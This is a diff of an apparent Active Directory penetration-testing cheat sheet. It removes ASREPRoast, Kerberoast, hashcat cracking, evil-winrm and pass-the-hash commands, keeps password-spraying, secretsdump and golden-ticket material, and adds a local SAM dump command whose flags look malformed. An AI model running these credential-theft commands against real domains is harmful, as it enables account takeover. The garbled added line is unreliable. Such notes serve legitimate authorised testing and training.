@@ -61,48 +61,6 @@ EOF
 netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
 ```
 
-## ASREPRoast discovered users without credentials
-```bash
-# Add -format hashcat -outputfile asrep.hash for direct hashcat output
-impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
-```
-
-## Hashcat ASREPRoast
-```bash
-# Add --show to display already cracked hashes
-hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
-```
-
-## Enumerate domain with valid credentials via NetExec
-```bash
-# ldap: add --password-policy, --users, --groups, --computers as needed
-# smb: add --shares for share enumeration
-netexec ldap $IP -u username -p password --users --groups --computers
-```
-
-## Kerberoast service accounts with credentials
-```bash
-# impacket: add -outputfile kerb_hashes.txt OR use netexec with --kerberoasting
-impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
-```
-
-## Hashcat Kerberoast
-```bash
-# Add --show to display already cracked hashes
-hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
-```
-
-## Test WinRM access with valid credentials
-```bash
-# netexec for quick test OR evil-winrm for interactive shell
-evil-winrm -i $IP -u username -p password
-```
-
-## Pass-the-hash with NetExec after obtaining NTLM hash
-```bash
-netexec smb $IP -u username -H aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
-```
-
 ## Test cracked service account credentials across domain
 ```bash
 # Test smb --shares OR winrm for shell access
@@ -110,14 +68,14 @@ netexec smb $IP -u serviceaccount -p crackedpassword --shares
 ```
 
 ## Dump domain credentials with secretsdump
+Add -just-dc for DC hashes only OR -just-dc-ntlm for NTLM only
 ```bash
-# Add -just-dc for DC hashes only OR -just-dc-ntlm for NTLM only
 impacket-secretsdump domain.local/username:password@$IP
 ```
 
-## Verify domain admin privileges
-```cmd
-net group "Domain Admins" /domain
+## Dump domain credentials from SAM and SYSTEM locally
+```
+impacket-secretsdump -sam SAM -system -SYSTEM LOCAL
 ```
 
 ## Create golden ticket with krbtgt hash
